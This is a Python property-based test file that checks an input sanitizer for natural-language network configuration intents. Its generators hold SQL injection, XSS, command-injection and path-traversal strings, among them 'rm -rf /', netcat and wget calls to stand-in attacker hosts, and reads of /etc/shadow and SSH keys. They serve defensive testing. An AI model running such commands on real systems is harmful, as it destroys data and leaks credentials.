"""Property-based tests for input sanitization security.

Feature: llm-integration-module
Property 23: Input sanitization security

This module validates that for any malformed or potentially malicious input,
the sanitization process neutralizes threats while preserving legitimate functionality.

Validates: Requirements 6.3
"""

import pytest
from hypothesis import given, strategies as st, settings, assume, HealthCheck
from hypothesis import Phase
from datetime import datetime
import re

from llm_integration_module.utils.input_sanitization import (
    InputSanitizer,
    ThreatLevel,
    AttackType,
    SanitizationResult
)


# Custom strategies for generating test inputs

@st.composite
def safe_network_intent(draw):
    """Generate safe network intent strings."""
    actions = ["Configure", "Set", "Update", "Create", "Modify", "Delete"]
    resources = ["switch", "port", "host", "flow", "slice", "bandwidth"]
    # Use only ASCII alphanumeric to avoid filtering issues
    identifiers = st.text(
        alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        min_size=1,
        max_size=10
    )
    
    action = draw(st.sampled_from(actions))
    resource = draw(st.sampled_from(resources))
    identifier = draw(identifiers)
    value = draw(st.integers(min_value=1, max_value=10000))
    
    return f"{action} {resource}{identifier} to {value}Mbps"


@st.composite
def sql_injection_input(draw):
    """Generate SQL injection attack patterns."""
    sql_keywords = [
        "SELECT * FROM users",
        "DROP TABLE network",
        "' OR '1'='1",
        "admin'--",
        "1; DROP TABLE users",
        "UNION SELECT password FROM users",
        "INSERT INTO users VALUES",
        "UPDATE users SET password",
        "DELETE FROM config WHERE",
        "' OR 1=1--"
    ]
    
    base_pattern = draw(st.sampled_from(sql_keywords))
    
    # Sometimes add legitimate text before/after
    if draw(st.booleans()):
        prefix = draw(st.text(alphabet=st.characters(whitelist_categories=("Lu", "Ll")), max_size=20))
        base_pattern = f"{prefix} {base_pattern}"
    
    return base_pattern


@st.composite
def xss_attack_input(draw):
    """Generate XSS attack patterns."""
    xss_patterns = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='malicious.com'></iframe>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<object data='malicious.swf'>",
        "<embed src='malicious.swf'>",
        "onclick=alert('XSS')",
        "onerror=alert('XSS')"
    ]
    
    return draw(st.sampled_from(xss_patterns))


@st.composite
def command_injection_input(draw):
    """Generate command injection attack patterns."""
    cmd_patterns = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "$(whoami)",
        "`cat /etc/shadow`",
        "test || wget malicious.com/shell.sh",
        "test & curl attacker.com",
        "test > /dev/null",
        "$(curl attacker.com)",
        "`id`"
    ]
    
    return draw(st.sampled_from(cmd_patterns))


@st.composite
def path_traversal_input(draw):
    """Generate path traversal attack patterns."""
    path_patterns = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32",
        "~/../../etc/shadow",
        "/etc/passwd",
        "C:\\Windows\\System32",
        "../../config/database.yml",
        "../.ssh/id_rsa",
        "/proc/self/environ",
        "\\\\server\\share",
        "file:///etc/passwd"
    ]
    
    return draw(st.sampled_from(path_patterns))


@st.composite
def mixed_malicious_input(draw):
    """Generate inputs with mixed attack patterns."""
    attacks = [
        sql_injection_input(),
        xss_attack_input(),
        command_injection_input(),
        path_traversal_input()
    ]
    
    attack1 = draw(draw(st.sampled_from(attacks)))
    attack2 = draw(draw(st.sampled_from(attacks)))
    
    separator = draw(st.sampled_from([" ", "\n", "\t", ""]))
    
    return f"{attack1}{separator}{attack2}"


@st.composite
def legitimate_with_special_chars(draw):
    """Generate legitimate inputs with special characters that should be preserved."""
    # Network intents often contain IPs, ports, colons, dots
    templates = [
        "Configure switch at {ip}:{port}",
        "Set bandwidth for host_{id} to {value}Mbps",
        "Create slice with priority {priority}",
        "Update flow on switch-{num}",
        "Monitor traffic on port {port}"
    ]
    
    template = draw(st.sampled_from(templates))
    
    # Generate valid values
    ip = f"{draw(st.integers(1, 255))}.{draw(st.integers(0, 255))}.{draw(st.integers(0, 255))}.{draw(st.integers(1, 255))}"
    port = draw(st.integers(1, 65535))
    id_val = draw(st.integers(1, 100))
    value = draw(st.integers(1, 10000))
    priority = draw(st.integers(1, 10))
    num = draw(st.integers(1, 100))
    
    return template.format(
        ip=ip,
        port=port,
        id=id_val,
        value=value,
        priority=priority,
        num=num
    )


@st.composite
def excessive_length_input(draw):
    """Generate excessively long inputs."""
    base_text = draw(st.text(min_size=1000, max_size=5000))
    return base_text


@st.composite
def malformed_input(draw):
    """Generate malformed inputs (non-strings, null bytes, control chars)."""
    malformed_types = [
        # Null bytes
        lambda: draw(st.text(min_size=5, max_size=50)) + "\x00" + draw(st.text(min_size=5, max_size=50)),
        # Control characters
        lambda: "test\x01\x02\x03control",
        # Mixed encodings
        lambda: "test\xff\xfe",
        # Repeated special chars
        lambda: draw(st.sampled_from(["<", ">", "&", "'", '"', "|", ";", "$"])) * draw(st.integers(10, 100))
    ]
    
    generator = draw(st.sampled_from(malformed_types))
    return generator()


# Property-based tests

class TestInputSanitizationProperties:
    """Property-based tests for input sanitization security."""
    
    @given(sql_injection_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_sql_injection_neutralization(self, malicious_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input containing SQL injection patterns,
        the sanitizer MUST detect and neutralize the threat.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(malicious_input, context="intent")
        
        # Property: SQL injection must be detected
        has_sql_violation = any(
            v.attack_type == AttackType.SQL_INJECTION
            for v in result.violations
        )
        assert has_sql_violation, (
            f"SQL injection not detected in: {malicious_input[:100]}"
        )
        
        # Property: Threat level must be CRITICAL or HIGH
        assert result.threat_level in [ThreatLevel.CRITICAL, ThreatLevel.HIGH], (
            f"SQL injection threat level too low: {result.threat_level}"
        )
        
        # Property: Input must be marked as unsafe
        assert result.is_safe is False, (
            "SQL injection marked as safe"
        )
        
        # Property: Violations must be recorded for traceability
        assert len(result.violations) > 0, (
            "No violations recorded for SQL injection"
        )
        
        # Property: All violations must have required metadata
        for violation in result.violations:
            assert violation.blocked is True, (
                "SQL injection violation not marked as blocked"
            )
            assert violation.description, (
                "Violation missing description"
            )
    
    @given(xss_attack_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_xss_neutralization(self, malicious_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input containing XSS patterns,
        the sanitizer MUST detect and neutralize the threat.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(malicious_input, context="intent")
        
        # Property: XSS must be detected
        has_xss_violation = any(
            v.attack_type == AttackType.XSS
            for v in result.violations
        )
        assert has_xss_violation, (
            f"XSS not detected in: {malicious_input[:100]}"
        )
        
        # Property: Threat level must be HIGH or CRITICAL
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL], (
            f"XSS threat level too low: {result.threat_level}"
        )
        
        # Property: Input must be marked as unsafe
        assert result.is_safe is False, (
            "XSS marked as safe"
        )
        
        # Property: Violations must be recorded for traceability
        assert len(result.violations) > 0, (
            "No violations recorded for XSS"
        )
        
        # Property: All violations must have required metadata
        for violation in result.violations:
            assert violation.blocked is True, (
                "XSS violation not marked as blocked"
            )
            assert violation.description, (
                "Violation missing description"
            )
    
    @given(command_injection_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_command_injection_neutralization(self, malicious_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input containing command injection patterns,
        the sanitizer MUST detect and neutralize the threat.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(malicious_input, context="intent")
        
        # Property: Command injection must be detected
        has_cmd_violation = any(
            v.attack_type == AttackType.COMMAND_INJECTION
            for v in result.violations
        )
        assert has_cmd_violation, (
            f"Command injection not detected in: {malicious_input[:100]}"
        )
        
        # Property: Threat level must be CRITICAL
        assert result.threat_level == ThreatLevel.CRITICAL, (
            f"Command injection threat level too low: {result.threat_level}"
        )
        
        # Property: Input must be marked as unsafe
        assert result.is_safe is False, (
            "Command injection marked as safe"
        )
        
        # Property: Sanitized output must not contain command injection chars
        dangerous_chars = [";", "|", "&", "$", "`"]
        for char in dangerous_chars:
            if char in malicious_input:
                assert char not in result.sanitized_input, (
                    f"Dangerous character '{char}' still present after sanitization"
                )
    
    @given(path_traversal_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_path_traversal_neutralization(self, malicious_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input containing path traversal patterns,
        the sanitizer MUST detect and neutralize the threat.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(malicious_input, context="intent")
        
        # Property: Path traversal must be detected
        has_path_violation = any(
            v.attack_type == AttackType.PATH_TRAVERSAL
            for v in result.violations
        )
        assert has_path_violation, (
            f"Path traversal not detected in: {malicious_input[:100]}"
        )
        
        # Property: Threat level must be HIGH or CRITICAL
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL], (
            f"Path traversal threat level too low: {result.threat_level}"
        )
        
        # Property: Input must be marked as unsafe
        assert result.is_safe is False, (
            "Path traversal marked as safe"
        )
    
    @given(safe_network_intent())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_legitimate_input_preserved(self, legitimate_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any legitimate network intent input,
        the sanitizer MUST preserve functionality and mark as safe.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(legitimate_input, context="intent")
        
        # Property: Legitimate input should be safe
        assert result.is_safe is True, (
            f"Legitimate input marked as unsafe: {legitimate_input}"
        )
        
        # Property: Threat level should be SAFE or LOW
        assert result.threat_level in [ThreatLevel.SAFE, ThreatLevel.LOW], (
            f"Legitimate input has high threat level: {result.threat_level}"
        )
        
        # Property: Core content should be preserved (allowing for whitespace normalization)
        # Extract alphanumeric content
        original_words = set(re.findall(r'\w+', legitimate_input.lower()))
        sanitized_words = set(re.findall(r'\w+', result.sanitized_input.lower()))
        
        # Most words should be preserved (relaxed threshold for special chars)
        if original_words:
            preserved_ratio = len(original_words & sanitized_words) / len(original_words)
            assert preserved_ratio >= 0.7, (
                f"Too much legitimate content removed: {preserved_ratio:.2%} preserved. "
                f"Original: {original_words}, Sanitized: {sanitized_words}"
            )
    
    @given(legitimate_with_special_chars())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_network_special_chars_preserved(self, network_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any legitimate network input with special characters
        (IPs, ports, colons, dots), the sanitizer MUST preserve these characters
        in network context.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(network_input, context="intent")
        
        # Property: Should be marked as safe
        assert result.is_safe is True, (
            f"Legitimate network input marked as unsafe: {network_input}"
        )
        
        # Property: Network-specific characters should be preserved
        # Colons, dots, hyphens, underscores are valid in network context
        network_chars = [":", ".", "-", "_"]
        for char in network_chars:
            if char in network_input:
                assert char in result.sanitized_input, (
                    f"Network character '{char}' removed from legitimate input"
                )
    
    @given(excessive_length_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_excessive_length_handled(self, long_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input exceeding maximum length,
        the sanitizer MUST truncate and detect the violation.
        
        Validates: Requirements 6.3
        """
        max_length = 1000
        sanitizer = InputSanitizer(max_length=max_length)
        
        # Only test if input actually exceeds max length
        assume(len(long_input) > max_length)
        
        result = sanitizer.sanitize(long_input, context="intent")
        
        # Property: Length violation must be detected
        has_length_violation = any(
            v.attack_type == AttackType.EXCESSIVE_LENGTH
            for v in result.violations
        )
        assert has_length_violation, (
            "Excessive length not detected"
        )
        
        # Property: Output must be truncated to max length
        assert len(result.sanitized_input) <= max_length, (
            f"Output not truncated: {len(result.sanitized_input)} > {max_length}"
        )
        
        # Property: Modifications should be recorded
        assert any("Truncated" in mod for mod in result.modifications_made), (
            "Truncation not recorded in modifications"
        )
    
    @given(malformed_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_malformed_input_handled(self, malformed):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any malformed input (null bytes, control chars),
        the sanitizer MUST neutralize the threat.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(malformed, context="intent")
        
        # Property: Null bytes must be removed
        assert '\x00' not in result.sanitized_input, (
            "Null bytes not removed from sanitized output"
        )
        
        # Property: If null bytes were present, modification should be recorded
        if '\x00' in malformed:
            assert any("null bytes" in mod.lower() for mod in result.modifications_made), (
                "Null byte removal not recorded"
            )
        
        # Property: Control characters should be removed (except newline/tab)
        for char in result.sanitized_input:
            if not char.isprintable():
                assert char in ['\n', '\t'], (
                    f"Unprintable control character present: {repr(char)}"
                )
    
    @given(mixed_malicious_input())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_multiple_threats_detected(self, multi_attack_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input containing multiple attack patterns,
        the sanitizer MUST detect all threats and assign appropriate threat level.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(multi_attack_input, context="intent")
        
        # Property: Multiple violations may be detected
        # At least one violation should be found
        assert len(result.violations) >= 1, (
            f"No violations detected in multi-attack input: {multi_attack_input[:100]}"
        )
        
        # Property: Overall threat level should be the highest detected
        assert result.threat_level in [ThreatLevel.HIGH, ThreatLevel.CRITICAL], (
            f"Multi-attack input has low threat level: {result.threat_level}"
        )
        
        # Property: Input must be marked as unsafe
        assert result.is_safe is False, (
            "Multi-attack input marked as safe"
        )
    
    @given(st.text(min_size=0, max_size=1000))
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_sanitization_always_returns_result(self, any_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any input (valid or invalid),
        the sanitizer MUST always return a SanitizationResult without crashing.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        # Property: Should never raise an exception
        result = sanitizer.sanitize(any_input, context="intent")
        
        # Property: Result must be a SanitizationResult
        assert isinstance(result, SanitizationResult), (
            "Sanitizer did not return SanitizationResult"
        )
        
        # Property: Result must have all required fields
        assert hasattr(result, 'original_input')
        assert hasattr(result, 'sanitized_input')
        assert hasattr(result, 'is_safe')
        assert hasattr(result, 'violations')
        assert hasattr(result, 'threat_level')
        
        # Property: Sanitized output must be a string
        assert isinstance(result.sanitized_input, str), (
            "Sanitized output is not a string"
        )
    
    @given(st.integers() | st.floats() | st.booleans() | st.none())
    @settings(max_examples=100, suppress_health_check=[HealthCheck.function_scoped_fixture])
    def test_property_non_string_input_handled(self, non_string_input):
        """
        Feature: llm-integration-module, Property 23: Input sanitization security
        
        Property: For any non-string input,
        the sanitizer MUST detect it as malformed and mark as unsafe.
        
        Validates: Requirements 6.3
        """
        sanitizer = InputSanitizer(max_length=2000)
        
        result = sanitizer.sanitize(non_string_input, context="intent")
        
        # Property: Non-string input must be detected
        has_malformed_violation = any(
            v.attack_type == AttackType.MALFORMED_INPUT
            for v in result.violations
        )
        assert has_malformed_violation, (
            f"Non-string input not detected as malformed: {type(non_string_input)}"
        )
        
        # Property: Must be marked as unsafe
        assert result.is_safe is False, (
            "Non-string input marked as safe"
        )
        
        # Property: Threat level should be HIGH
        assert result.threat_level == ThreatLevel.HIGH, (
            f"Non-string input has wrong threat level: {result.threat_level}"
        )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
